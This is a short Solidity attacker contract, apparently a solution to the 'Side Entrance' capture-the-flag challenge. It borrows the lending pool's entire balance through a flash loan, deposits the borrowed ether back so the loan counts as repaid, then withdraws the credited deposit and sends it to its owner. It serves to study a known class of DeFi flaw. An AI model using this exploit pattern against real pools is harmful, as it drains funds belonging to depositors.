// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";


contract AttackerSideEntrance {
    address public owner;
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function callPool() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}